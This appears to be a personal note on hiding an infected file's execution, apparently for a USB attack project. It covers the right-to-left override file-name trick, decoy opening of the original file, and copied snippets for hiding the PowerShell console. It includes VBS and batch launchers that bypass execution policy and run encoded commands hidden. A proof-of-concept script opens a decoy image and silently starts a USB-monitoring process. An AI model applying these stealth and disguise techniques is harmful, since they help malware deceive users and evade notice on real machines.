---
tags:
  - Work
  - USB
  - CCK
banner:
banner: "![[binary-numbers-tunnel-1080p-hd-wallpaper-wallpapers-h-w-ibackgroundz.com.jpg]]"
---

# Ideas to hide files

## Hide original files

To hide the infection even after openen the file the following options are given:
1. When executing the manipulated file, open the original file to avoid raising suspicion.
2. When running the manipulated file, replace itself with the original file.

Left-To-Right overwrite Unicode character: 202E


### ==Additional data Streams==

### Hidden folder
1. create a new hidden Folder
2. replace picture and name of folder with invisible ones


## Hide powershell console

https://stackoverflow.com/questions/40617800/opening-powershell-script-and-hide-command-prompt-but-not-the-gui
Hiding the console for .ps1 files when openen with gui 
```powershell
# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

function Show-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()

    # Hide = 0,
    # ShowNormal = 1,
    # ShowMinimized = 2,
    # ShowMaximized = 3,
    # Maximize = 3,
    # ShowNormalNoActivate = 4,
    # Show = 5,
    # Minimize = 6,
    # ShowMinNoActivate = 7,
    # ShowNoActivate = 8,
    # Restore = 9,
    # ShowDefault = 10,
    # ForceMinimized = 11

    [Console.Window]::ShowWindow($consolePtr, 4)
}

function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
```

To hide the console with this code, all you need to do is call `Hide-Console`. Since you already have code in the `Shown` event (`$objForm.Add_Shown`) we can simply add another line to call the command:
```powershell
$objForm.Add_Shown({
    $objForm.Activate()
    Hide-Console
})
```

---

https://stackoverflow.com/questions/1802127/how-to-run-a-powershell-script-without-displaying-a-window
I add this code in the beginning of all my PowerShell scripts that I need to run in background.
```powershell
# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
```

---

Create a shortcut that calls the PowerShell script and set the Run option to Minimized. This will prevent a window from flashing although you will still get a momentary blip of the script running on the Task Bar.

---

Make a vbs script to run a hidden batch file which launches the powershell script. Seems silly to make 3 files for this task but atleast the total size is less than 2KB and it runs perfect from tasker or manually (you dont see anything).

**scriptName.vbs**

```vbs
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "C:\Users\leathan\Documents\scriptName.bat" & Chr(34), 0
Set WinScriptHost = Nothing
```

**scriptName.bat**

```batch
powershell.exe -ExecutionPolicy Bypass C:\Users\leathan\Documents\scriptName.ps1
```

**scriptName.ps1**

```powershell
Your magical code here.
```

---

A single vbs file solution. You first have to convert your ps script to base64 string, place it in a variable in the template shown below and save it as I vbs file. Runs without powershell popppring up.

```vbs
dim EncodedCommand
EncodedCommand = "COMMAND"

pSCmd = "powershell.exe -noexit -windowstyle Hidden -executionpolicy bypass -encodedcommand " & EncodedCommand

CreateObject("WScript.Shell").Run pSCmd, 0, True
```
---

# PoC

The Script can be executed through a shortcut with the following options:
```
powershell.exe -executionpolicy bypass -noexit -windowstyle hidden
```
additionally should the run option be set to Minimized and the Icon and Name has to be changed.

Script to start a sub process that listenes to newly inserted USB devices.
```
# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console
$Script = @'
    $Devices = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
    $DeviceCount= $Devices.Count
    while ($Devices.Count -le $DeviceCount) {
        Write-Host "Waiting for USB devices to be connected..."
        $Devices = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
        Start-Sleep -Seconds 0.1
    }
    Stop-Process -ID $PID
'@
Start-Process hacker.jpg

Remove-Item -Path "C:\Users\Public\Documents\test.ps1" -Force
New-Item -Path "C:\Users\Public\Documents\test.ps1" -ItemType "file" -Value $Script
Start-Process powershell.exe -ArgumentList "-noexit", "C:\Users\Public\Documents\test.ps1" #-WindowStyle Hidden 
```
